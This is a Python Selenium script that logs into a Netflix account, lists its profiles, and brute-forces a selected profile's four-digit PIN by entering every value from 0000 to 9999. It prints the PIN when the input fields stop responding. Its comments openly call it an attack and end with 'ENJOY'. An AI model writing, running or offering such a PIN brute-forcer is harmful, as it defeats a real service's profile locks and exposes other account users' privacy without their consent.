from selenium import webdriver
import time
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument('window-size=1920x1080')
chrome_options.add_experimental_option("prefs", { "profile.default_content_setting_values.notifications": 1 })
driver = webdriver.Chrome('./chromedriver', options=chrome_options)
time.sleep(1)

#OPEN NETFLIX PAGE IN BROWSER
driver.get("https://www.netflix.com/in/login")
#ENTER EMAIL ID 
email_element = driver.find_element_by_xpath('.//*[@id="id_userLoginId"]').send_keys(str(input("Email Netlfix Email ID:")))
#ENTER PASSWORD
password_element = driver.find_element_by_xpath('.//*[@id="id_password"]').send_keys(str(input("Email Netflix Password:")))
#THIS WILL CLICK ON LOGIN BUTTON
log_btm_element = driver.find_element_by_xpath('.//*[@class="btn login-button btn-submit btn-small" and @type="submit"]').click()
time.sleep(2)
#THIS WILL SELECT ALL LIST OF PROFILE AVAIABLE IN THAT PROFILE 
profiles = driver.find_elements_by_css_selector('ul.choose-profile > li')
#THIS WILL PRINT PEOFILES AND USER HAVE TO SELECT PROFILE NUMBER TO START BRUTE ATTACK
profile_names = [profile.text for profile in profiles if profile.text != "Add Profile"]
for i in profile_names:
            print(f'{i.index(i)+1}. {i}')
#THIS WILL SELECT PROFILE 
profiles[int(input("Select Profile Number to attack"))-1].click()
#ATTACK STARTED , FROM 0000 TO 9999
for i in range(9999+1):
    pin='{0:04}'.format(i) #GENRATE 4 DIGIT NUMBER STRING I.E 0000,1111,2222,3333,0045,...,9999
    print(f'TRYING PIN {pin}')
    try:
        for j in range(4):
            driver.find_element_by_xpath(f'.//*[@data-uia="pin-number-{j}"]').send_keys(int(pin[j]))
    except Exception: #INTESERTED EXCEPTION HANDLING TO PRINT THE PIN 
        print(f'//  PIN FOUND: {pin}  // ')
        break
print("// ENJOY //")